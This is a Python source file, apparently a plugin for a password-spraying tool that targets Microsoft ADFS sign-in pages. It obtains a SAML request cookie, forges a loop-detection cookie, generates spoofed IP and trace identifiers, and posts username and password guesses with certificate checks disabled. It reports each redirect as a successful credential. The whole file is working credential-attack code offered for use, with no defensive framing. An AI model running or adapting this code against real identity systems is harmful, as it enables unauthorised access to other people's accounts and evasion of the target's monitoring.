import requests
import utils.utils as utils
import base64
from datetime import datetime
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def adfs_authenticate(url, username, password, useragent, pluginargs):

    data_response = {
        'result' : None,    # Can be "success", "failure" or "potential"
        'error' : False,
        'output' : "",
        'valid_user' : False
    }

    post_data = {
        'UserName' : username,
        'Password' : password,
        'AuthMethod' : 'FormsAuthentication'
    }

    signin = {
        'SignInIdpSite' : 'SignInIdpSite',
        'SignInSubmit' : 'Sign in',
        'SingleSignOut' : 'SingleSignOut'
    }

    spoofed_ip = utils.generate_ip()  # maybe use client related IP address
    amazon_id = utils.generate_id()
    trace_id = utils.generate_trace_id()

    idp_url = pluginargs['url'] + "/adfs/ls/idpinitiatedsignon"
    spray_url = pluginargs['url'] + "/adfs/ls"

    d = datetime.now()
    dt = d.strftime('%Y-%m-%dT%H:%M:%SZ') + "\\1"
    datetime_bytes = dt.encode("ascii")
    base64_bytes = base64.b64encode(datetime_bytes)
    datetime_b64 = base64_bytes.decode("ascii")

    try:
        session = requests.session()
        resp = session.post(idp_url, data=signin, verify=False, allow_redirects=False)
        MSISSamlCookie = session.cookies['MSISSamlRequest']

    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = ex
        pass

    headers = {
        'Content-Type' : 'application/x-www-form-urlencoded',
        'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9, image/webp,*/*;q=0.8',
        'Cookie' : 'Cookie: MSISLoopDetectionCookie=' + datetime_b64 + '; MSISSamlRequest=' + MSISSamlCookie
    }

    headers = utils.add_custom_headers(pluginargs, headers)


    try:

        resp = requests.post(spray_url, headers=headers, data=post_data, verify=False, allow_redirects=False)

        if resp.status_code == 302:
            data_response['result'] = "success"
            data_response['output'] = f"[+] SUCCESS: => {username}:{password}"
            data_response['valid_user'] = True

        else:  # fail
            data_response['result'] = "failure"
            data_response['output'] = f"[-] FAILURE: {resp.status_code} => {username}:{password}"

    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = ex
        pass

    return data_response
